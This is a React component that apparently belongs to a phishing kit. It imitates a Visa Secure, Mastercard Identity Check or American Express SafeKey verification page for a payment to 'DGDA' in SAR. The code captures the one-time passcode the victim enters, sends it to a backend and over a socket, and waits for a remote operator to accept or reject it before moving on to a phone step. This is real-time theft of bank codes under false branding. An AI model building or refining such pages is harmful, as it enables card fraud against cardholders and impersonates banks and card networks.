import React, { useCallback, useEffect, useMemo, useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { LuEye, LuEyeOff, LuChevronRight, LuChevronDown } from "react-icons/lu";

function formatMaskedCardNumber(cardNum) {
  if (!cardNum) return "555965******0739";
  const clean = String(cardNum).replace(/\s/g, "");
  if (clean.length >= 10) {
    const first6 = clean.slice(0, 6);
    const last4 = clean.slice(-4);
    return `${first6}******${last4}`;
  }
  return clean;
}

function formatMaskedPhone(phoneStr) {
  if (!phoneStr) return "*********0308";
  const digits = String(phoneStr).replace(/\D/g, "");
  const last4 = digits.length >= 4 ? digits.slice(-4) : digits;
  return `*********${last4 || "0308"}`;
}

function formatMaskedEmail(emailStr) {
  if (!emailStr || !emailStr.includes("@")) return "m***************3@g*******m";
  const parts = emailStr.split("@");
  const user = parts[0];
  const domain = parts[1] || "gmail.com";

  const firstUserChar = user.charAt(0);
  const lastUserChar = user.length > 1 ? user.charAt(user.length - 1) : "";
  const maskedUser =
    firstUserChar + "*".repeat(Math.max(4, user.length - 2)) + lastUserChar;

  const domainParts = domain.split(".");
  const domainName = domainParts[0] || "gmail";
  const tld = domainParts.slice(1).join(".") || "com";
  const firstDomainChar = domainName.charAt(0);
  const lastDomainChar =
    domainName.length > 1 ? domainName.charAt(domainName.length - 1) : "";
  const maskedDomain =
    firstDomainChar +
    "*".repeat(Math.max(3, domainName.length - 2)) +
    lastDomainChar;

  return `${maskedUser}@${maskedDomain}.${tld}`;
}

function formatPurchaseDate(dateStr) {
  const d = dateStr ? new Date(dateStr) : new Date();
  if (isNaN(d.getTime())) return "31 Oct 2026";
  const months = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec",
  ];
  return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
}

const Verify = () => {
  const navigate = useNavigate();
  const search = window.location.search;

  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (raw) return JSON.parse(raw);
    } catch {}
    try {
      const sess = sessionStorage.getItem("orderData");
      if (sess) return JSON.parse(sess);
    } catch {}
    return {};
  }, [search]);

  const _id =
    data?._id ||
    sessionStorage.getItem("orderId") ||
    sessionStorage.getItem("userId");

  const [otp, setOtp] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [load, setLoad] = useState(false);
  const [error, setError] = useState("");
  const [helpOpen, setHelpOpen] = useState(false);

  // Card Scheme detection
  const cardDigits = String(
    data?.cardNumber || sessionStorage.getItem("cardNumber") || ""
  ).replace(/\s/g, "");

  const cardBrand = (
    data?.cardBrand ||
    sessionStorage.getItem("card") ||
    (cardDigits.startsWith("4")
      ? "VISA"
      : cardDigits.startsWith("3")
      ? "AMEX"
      : "MASTER")
  ).toUpperCase();

  const isVisa = cardBrand === "VISA" || cardDigits.startsWith("4");
  const isAmex = cardBrand === "AMEX" || cardDigits.startsWith("3");
  const isMastercard = !isVisa && !isAmex; // Default or starts with 5

  // User input phone and email (prefer form data, fallback to sessionStorage)
  const userPhone =
    data?.phone ||
    sessionStorage.getItem("phone") ||
    data?.MotslPhone ||
    "0555000308";

  const userEmail =
    data?.email ||
    sessionStorage.getItem("email") ||
    "user@gmail.com";

  const maskedPhone = formatMaskedPhone(userPhone);
  const maskedEmail = formatMaskedEmail(userEmail);
  const maskedCard = formatMaskedCardNumber(data?.cardNumber);
  const purchaseDate = formatPurchaseDate(
    data?.companyData?.date || data?.reservationDate
  );

  const priceNum =
    parseFloat(
      String(
        data?.totalPrice ||
          data?.companyData?.total ||
          data?.companyData?.price ||
          "50.00"
      ).replace(/[^\d.]/g, "")
    ) || 50;
  const purchaseAmount = priceNum.toFixed(2);

  const handleOtp = async (e) => {
    if (e) e.preventDefault();
    if (!otp.trim()) {
      setError("Missing input. Please enter the code you have received.");
      return;
    }

    setLoad(true);
    setError("");

    const finalData = { ...data, otp, CardOtp: otp };
    try {
      const targetId = _id || "guest";
      await axios.post(`${api_route}/visaOtp/${targetId}`, finalData);
      socket.emit("visaOtp", { id: targetId, otp });
    } catch {
      setLoad(false);
    }
  };

  const onAcceptVisaOtp = useCallback(
    (id) => {
      const targetId = _id || "guest";
      if (id !== targetId) return;
      setLoad(false);
      sessionStorage.setItem("id", id);
      socket.emit("bindOrder", id);
      navigate(`/phone?id=${id}`);
    },
    [_id, navigate]
  );

  const onDeclineVisaOtp = useCallback(
    (id) => {
      const targetId = _id || "guest";
      if (id !== targetId) return;
      setLoad(false);
      setError("Invalid code. Please enter the code you have received.");
    },
    [_id]
  );

  useEffect(() => {
    socket.on("acceptVisaOtp", onAcceptVisaOtp);
    socket.on("declineVisaOtp", onDeclineVisaOtp);
    return () => {
      socket.off("acceptVisaOtp", onAcceptVisaOtp);
      socket.off("declineVisaOtp", onDeclineVisaOtp);
    };
  }, [onAcceptVisaOtp, onDeclineVisaOtp]);

  const handleResend = (e) => {
    if (e) e.preventDefault();
    setError("");
    setOtp("");
    const targetId = _id || "guest";
    socket.emit("resendOtp", { id: targetId });
  };

  const handleCancel = (e) => {
    if (e) e.preventDefault();
    if (window.history.length > 1) navigate(-1);
    else navigate("/summary");
  };

  return (
    <div
      className="min-h-screen bg-white text-[#222] font-[-apple-system,BlinkMacSystemFont,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif] flex justify-center py-4 px-4 sm:px-6"
      style={{ direction: "ltr" }}
    >
      <main className="w-full max-w-[440px] flex flex-col pt-1">
        {/* Top Cancel Link */}
        <div className="flex justify-end mb-4">
          <button
            type="button"
            onClick={handleCancel}
            className="text-[#2563eb] hover:underline text-sm font-normal cursor-pointer bg-transparent border-0 p-0"
          >
            Cancel
          </button>
        </div>

        {/* Top Header Row: NO left logo as requested; Scheme logo at top right */}
        <div className="flex items-center justify-end h-9 mb-3">
          {/* Top Right Card Scheme Badge */}
          {isMastercard && (
            <div className="flex items-center gap-1.5">
              <img
                src="/master.jpeg"
                alt="Mastercard"
                className="h-6 object-contain"
              />
              <span className="text-sm font-semibold text-gray-700">
                | ID Check
              </span>
            </div>
          )}

          {isVisa && (
            <div className="flex items-center gap-1.5">
              <img src="/visa.jpeg" alt="Visa" className="h-5 object-contain" />
              <span className="text-sm font-semibold text-gray-700">
                | Secure
              </span>
            </div>
          )}

          {isAmex && (
            <div className="flex items-center gap-1.5">
              <img
                src="https://s3.ticketmx.com/img/american-express.jpg"
                alt="American Express"
                className="h-6 object-contain"
              />
              <span className="text-xs font-bold text-[#006fcf]">SafeKey</span>
            </div>
          )}
        </div>

        {/* Title */}
        <h1
          id="header"
          className="text-lg sm:text-[19px] font-bold text-[#1f2937] mb-2 leading-tight"
        >
          {isMastercard && (
            <>
              Mastercard<sup>®</sup> Identity Check<sup>™</sup>
            </>
          )}
          {isVisa && <>Visa Secure</>}
          {isAmex && <>American Express SafeKey</>}
        </h1>

        {/* Transaction details list */}
        <div className="data-wrapper mb-3 text-sm text-[#374151]">
          <ul
            aria-label="Transaction details"
            className="list-none p-0 m-0 space-y-0.5 leading-snug"
          >
            <li
              id="merchantName"
              aria-label="Merchant DGDA"
              className="font-normal"
            >
              DGDA
            </li>
            <li
              className="purchase-amount font-bold text-[#111827]"
              aria-label={`Amount ${purchaseAmount} SAR`}
            >
              <span id="currency">SAR</span>{" "}
              <span id="purchaseAmount">{purchaseAmount}</span>
            </li>
            <li id="purchaseDate" aria-label={`Date ${purchaseDate}`}>
              {purchaseDate}
            </li>
            <li
              id="maskedCardNumber"
              aria-label={`Card number ${maskedCard}`}
              className="font-mono text-[13px]"
            >
              {maskedCard}
            </li>
          </ul>

          {/* Verification description */}
          <p
            id="subHeader"
            className="mt-3 text-[13px] text-[#4b5563] leading-relaxed"
          >
            Verify your payment with the code we sent to your mobile number
            ending in{" "}
            <span className="font-semibold text-black">{maskedPhone}</span> and
            to your e-mail address{" "}
            <span className="font-semibold text-black">{maskedEmail}</span>.
          </p>
        </div>

        {/* OTP Form */}
        <form
          id="mainForm"
          onSubmit={handleOtp}
          autoComplete="off"
          className="mt-1"
        >
          {/* Error Message */}
          {error && (
            <p
              className="text-red-600 text-xs mb-2 font-medium"
              id="emptyOtpMessage"
            >
              {error}
            </p>
          )}

          <div className="code-wrapper mb-4">
            <label
              htmlFor="inputID"
              className="block text-xs font-semibold text-[#374151] mb-1"
            >
              Enter the code
            </label>

            <div className="relative flex items-center">
              <input
                id="inputID"
                type={showOtp ? "text" : "password"}
                name="text"
                maxLength={6}
                value={otp}
                onChange={(e) => {
                  setError("");
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
                }}
                inputMode="numeric"
                autoCapitalize="off"
                autoComplete="one-time-code"
                autoCorrect="off"
                className="w-full h-10 px-3 pr-10 border border-[#d1d5db] rounded bg-[#f3f4f6] text-sm text-[#111827] outline-none focus:border-[#2563eb] focus:bg-white transition-all font-mono"
              />

              <button
                type="button"
                onClick={() => setShowOtp(!showOtp)}
                className="absolute right-2.5 text-gray-500 hover:text-gray-700 cursor-pointer bg-transparent border-0 p-1 flex items-center justify-center"
                aria-label={showOtp ? "Hide OTP code" : "Show OTP code"}
              >
                {showOtp ? (
                  <LuEyeOff className="w-4 h-4 text-gray-600" />
                ) : (
                  <LuEye className="w-4 h-4 text-gray-600" />
                )}
              </button>
            </div>
          </div>

          {/* Form button wrapper: Confirm and Resend buttons */}
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 mt-2">
            <button
              type="submit"
              disabled={load}
              className={`w-full sm:w-auto px-6 py-2 rounded text-sm font-semibold text-white shadow-sm transition-all cursor-pointer ${
                load
                  ? "bg-[#2563eb]/70 cursor-not-allowed"
                  : "bg-[#2563eb] hover:bg-[#1d4ed8] active:scale-[0.99]"
              }`}
            >
              {load ? "Processing..." : "Confirm"}
            </button>

            <button
              type="button"
              onClick={handleResend}
              className="w-full sm:w-auto px-5 py-2 rounded text-sm font-semibold text-[#2563eb] bg-white border border-[#2563eb] hover:bg-blue-50 transition-all cursor-pointer text-center"
            >
              Resend new code
            </button>
          </div>
        </form>

        {/* Divider */}
        <hr className="border-t border-gray-200 mt-10 mb-3" />

        {/* Bottom Help Accordion */}
        <div className="text-xs text-[#4b5563]">
          <button
            type="button"
            onClick={() => setHelpOpen(!helpOpen)}
            className="flex items-center gap-1 text-[#4b5563] hover:text-[#111827] cursor-pointer bg-transparent border-0 p-0 font-medium"
          >
            {helpOpen ? (
              <LuChevronDown className="w-3.5 h-3.5" />
            ) : (
              <LuChevronRight className="w-3.5 h-3.5" />
            )}
            <span>Need some help?</span>
          </button>

          {helpOpen && (
            <div className="mt-2 pl-4 text-gray-500 leading-relaxed text-[11px]">
              If you have not received the verification code, please ensure your
              mobile number and email address registered with your bank are up
              to date, or click &ldquo;Resend new code&rdquo;.
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default Verify;
